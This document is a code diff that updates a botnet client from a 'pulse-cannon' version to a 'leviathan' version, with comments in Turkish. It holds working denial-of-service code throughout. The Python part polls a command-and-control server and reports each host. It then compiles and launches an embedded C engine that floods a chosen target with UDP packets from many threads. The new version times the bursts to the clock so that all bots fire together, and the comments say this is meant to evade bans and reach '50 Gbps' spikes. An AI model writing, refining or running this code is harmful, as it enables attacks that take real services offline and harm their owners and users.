@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 """
-  ENI & LO — v11 PULSE-CANNON MODE (2026)
-  =======================================
-  - Synchronized Burst Protocol.
-  - Vurma Evresi: 2 saniye boyunca 128 thread aynı anda %100 yüklenir.
-  - Dinlenme Evresi: 8 saniye tam sessizlik (Oracle NIC buffer'ları boşaltır, banı engeller).
-  - Sonuç: Grafikte anlık devasa Everest dağları (Spike) yaratır.
+  ENI & LO — v12 SYNCHRONIZED LEVIATHAN MODE (2026)
+  =================================================
+  - TRUE SYNCHRONIZATION: Bütün process ve thread'ler Linux sistem saatini okur.
+  - 15 Saniye Döngüsü: 
+      - İlk 3 saniye: 128 thread AYNI MİLİSANİYEDE ateşe başlar (Maksimum Spike).
+      - Kalan 12 saniye: Tam sessizlik. Sunucu dinlenir.
+  - Hedef: Tek makineden 50 Gbps anlık dalga (Spike) yaratmak.
 """
 
 import socket, json, threading, time, urllib.request, platform
@@ -16,7 +17,7 @@ DEFAULT_PORT = 443
 CPU_CORES    = multiprocessing.cpu_count()
 
 # ============================================================================
-#  v11 PULSE-CANNON C-ENGINE
+#  v12 LEVIATHAN C-ENGINE (Time-Synchronized)
 # ============================================================================
 C_ENGINE = r"""
 #define _GNU_SOURCE
@@ -31,11 +32,11 @@ C_ENGINE = r"""
 #include <pthread.h>
 #include <signal.h>
 #include <fcntl.h>
-#include <sys/time.h>
+#include <time.h>
 
-#define BATCH 1024
+#define BATCH 2048
 #define PKTSIZE 1472
-#define SOCKS_PER_TH 4
+#define SOCKS_PER_TH 2
 
 static volatile int g_run = 1;
 static char g_ip[64];
@@ -43,19 +44,12 @@ static int g_port;
 
 void on_sig(int s) { g_run = 0; }
 
-long long current_timestamp() {
-    struct timeval te; 
-    gettimeofday(&te, NULL); 
-    long long milliseconds = te.tv_sec*1000LL + te.tv_usec/1000; 
-    return milliseconds;
-}
-
-void* pulsecannon_thread(void* arg) {
+void* leviathan_thread(void* arg) {
     int tid = *(int*)arg;
     free(arg);
 
     int fds[SOCKS_PER_TH];
-    int buf = 16 * 1024 * 1024; // 16MB buffer
+    int buf = 32 * 1024 * 1024; // 32MB buffer per socket
 
     struct sockaddr_in dst = {0};
     dst.sin_family = AF_INET;
@@ -72,7 +66,7 @@ void* pulsecannon_thread(void* arg) {
     }
 
     char payload[PKTSIZE];
-    memset(payload, 'P', PKTSIZE); // P for Pulse
+    memset(payload, 'L', PKTSIZE); // L for Leviathan
 
     struct iovec iov[BATCH];
     struct mmsghdr msg[BATCH];
@@ -89,22 +83,18 @@ void* pulsecannon_thread(void* arg) {
 
     int cur = 0;
     while (g_run) {
-        // --- 1. VURMA EVRESI (BURST PHASE) ---
-        // 2 saniye boyunca aralıksız, ölümüne paket bas
-        long long start_ms = current_timestamp();
-        while (g_run && (current_timestamp() - start_ms < 2000)) {
+        time_t current_time = time(NULL);
+        
+        // 15 saniyelik döngü (0, 1, 2. saniyelerde vur. 3 ile 14 arası uyu)
+        if (current_time % 15 < 3) {
+            // VURMA ZAMANI (Ateş serbest)
             if(fds[cur] >= 0) {
                 sendmmsg(fds[cur], msg, BATCH, 0);
             }
             cur = (cur + 1) % SOCKS_PER_TH;
-        }
-        
-        // --- 2. DINLENME EVRESI (RECHARGE PHASE) ---
-        // 8 saniye bekle, Oracle NIC buffer'ları boşalsın, tokenlar dolsun
-        int slept = 0;
-        while (g_run && slept < 80) { // 80 * 100ms = 8 seconds
+        } else {
+            // DİNLENME ZAMANI (100ms uyu ki CPU rahatlasın)
             usleep(100000); 
-            slept++;
         }
     }
     
@@ -127,7 +117,7 @@ int main(int argc, char** argv) {
     for (int i = 0; i < threads; i++) {
         int* id = malloc(sizeof(int));
         *id = i;
-        pthread_create(&thr[i], NULL, pulsecannon_thread, id);
+        pthread_create(&thr[i], NULL, leviathan_thread, id);
     }
     
     for (int i = 0; i < threads; i++) {
@@ -140,8 +130,8 @@ int main(int argc, char** argv) {
 
 def compile_engine(cwd):
     if platform.system() != "Linux": return None
-    binpath = os.path.join(cwd, "pulsecannon_engine")
-    srcpath = os.path.join(cwd, "pulsecannon_engine.c")
+    binpath = os.path.join(cwd, "leviathan_engine")
+    srcpath = os.path.join(cwd, "leviathan_engine.c")
     with open(srcpath, "w") as f: f.write(C_ENGINE)
     subprocess.run(["gcc","-O3","-march=native","-funroll-loops",srcpath,"-o",binpath,"-lpthread"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     os.chmod(binpath, 0o755)
@@ -156,11 +146,11 @@ def bot_process(wid, c2h, c2p, workdir):
     engine_proc = None
     last_aid = None
     
-    print(f"\033[94m[PULSE-{wid:02d}] Charging capacitors...\033[0m")
+    print(f"\033[96m[LEVIATHAN-{wid:02d}] Synchronizing clocks...\033[0m")
 
     while True:
         try:
-            body = json.dumps({"bot_id": bid, "hostname": platform.node(), "os": "Linux PULSECANNON"}).encode()
+            body = json.dumps({"bot_id": bid, "hostname": platform.node(), "os": "Linux LEVIATHAN"}).encode()
             req = urllib.request.Request(poll, data=body, headers={"Content-Type":"application/json"})
             with urllib.request.urlopen(req, timeout=3) as resp:
                 cmd = json.loads(resp.read().decode())
@@ -176,7 +166,7 @@ def bot_process(wid, c2h, c2p, workdir):
                     port = int(cmd.get("port", 80))
                     threads = 4 # 32 proc * 4 = 128 threads
                     
-                    print(f"\033[91m[!] PULSE-{wid:02d} FIRING 10-SECOND BURSTS AT {target}:{port} !!\033[0m")
+                    print(f"\033[91m[!] LEVIATHAN-{wid:02d} SYNCED! FIRING EVERY 15 SECONDS AT {target}:{port} !!\033[0m")
                     engine_proc = subprocess.Popen([engine_bin, target, str(port), str(threads)])
                     last_aid = aid
                     
@@ -186,13 +176,13 @@ def bot_process(wid, c2h, c2p, workdir):
                         except: pass
                         engine_proc = None
                         last_aid = None
-                        print(f"\033[92m[PULSE-{wid:02d}] Holding fire.\033[0m")
+                        print(f"\033[92m[LEVIATHAN-{wid:02d}] Holding fire.\033[0m")
         except:
             pass
         time.sleep(0.5 + random.uniform(0, 0.5))
 
 def main():
-    print(f"\033[91m  ☢  ENI & LO — v11 PULSE-CANNON MODE  ☢\033[0m\n")
+    print(f"\033[91m  ☢  ENI & LO — v12 SYNCHRONIZED LEVIATHAN MODE  ☢\033[0m\n")
     host = DEFAULT_C2
     port = DEFAULT_PORT
     if len(sys.argv) > 1: host = sys.argv[1]
